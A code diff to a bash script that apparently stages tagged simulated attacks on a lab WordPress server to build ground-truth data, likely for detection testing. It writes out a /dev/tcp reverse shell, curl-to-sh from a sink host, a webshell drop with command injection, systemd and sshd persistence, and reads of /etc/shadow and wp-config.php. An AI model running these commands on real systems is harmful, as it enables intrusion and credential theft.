@@ -12,9 +12,8 @@
 #
 # Every attack is given a unique tag that appears in the paths and arguments it
 # uses, and each run is appended to a JSONL manifest used as ground truth.
-set -euo pipefail
+set -uo pipefail
 
-_DURATION="${1:-300}"
 SITE_URL="${2:-http://10.10.0.10}"
 WP_DIR="${WP_DIR:-/usr/share/wordpress}"
 SINK="${SINK:-10.10.0.1:4444}"
@@ -23,7 +22,9 @@ MANIFEST="${MANIFEST:-/tmp/attacks-manifest.jsonl}"
 SSH_TARGET="${SSH_TARGET:-}"
 
 SUDO=""
-[ "$(id -u)" -ne 0 ] && SUDO="sudo"
+if [ "$(id -u)" -ne 0 ]; then
+    SUDO="sudo"
+fi
 
 SINK_HOST="${SINK%%:*}"
 SINK_PORT="${SINK##*:}"
@@ -56,7 +57,7 @@ Description=$TAG
 Type=oneshot
 ExecStart=/bin/true
 EOF
-    $SUDO systemctl daemon-reload >/dev/null 2>&1 || true
+    $SUDO systemctl daemon-reload >/dev/null 2>&1
 }
 
 persist_sshd() {
@@ -85,25 +86,26 @@ EOF
 webshell_exec() {
     webshell_drop
     curl -fsS --max-time 5 "${SITE_URL%/}/wp-content/plugins/$TAG.php?c=id%3B%23$TAG" \
-        >/dev/null 2>&1 || true
+        >/dev/null 2>&1
     $SUDO rm -f "$WP_DIR/wp-content/plugins/$TAG.php"
 }
 
 reverse_shell() {
-    timeout 5 bash -c "bash -i >& /dev/tcp/$SINK_HOST/$SINK_PORT 0>&1 # $TAG" || true
+    timeout 5 bash -c "bash -i >& /dev/tcp/$SINK_HOST/$SINK_PORT 0>&1 # $TAG"
 }
 
 curl_pipe_sh() {
-    curl -fsS --max-time 5 "http://$SINK_HOST:$SINK_PORT/$TAG" 2>/dev/null | sh || true
+    curl -fsS --max-time 5 "http://$SINK_HOST:$SINK_PORT/$TAG" 2>/dev/null | sh
 }
 
 exfil_connect() {
-    curl -fsS --max-time 5 -o /dev/null "http://$SINK_HOST:$SINK_PORT/$TAG" || true
+    curl -fsS --max-time 5 -o /dev/null "http://$SINK_HOST:$SINK_PORT/$TAG"
 }
 
 cred_read() {
-    $SUDO grep -F "$TAG" /etc/shadow >/dev/null 2>&1 || true
-    $SUDO grep -RF "$TAG" "$WP_DIR/wp-config.php" >/dev/null 2>&1 || true
+    $SUDO grep -F "$TAG" /etc/shadow >/dev/null 2>&1
+    $SUDO grep -RF "$TAG" "$WP_DIR/wp-config.php" >/dev/null 2>&1
+    return 0
 }
 
 run_attack() {
@@ -126,7 +128,7 @@ run_attack() {
         printf "SUDO='sudo -n'\n"
         declare -f "${ATTACKS[@]}"
         printf '%s\n' "$attack"
-    } | ssh -o BatchMode=yes "$SSH_TARGET" "bash -s -- $_DURATION $SITE_URL"
+    } | ssh -o BatchMode=yes "$SSH_TARGET" "bash -s"
 }
 
 probe_target() {
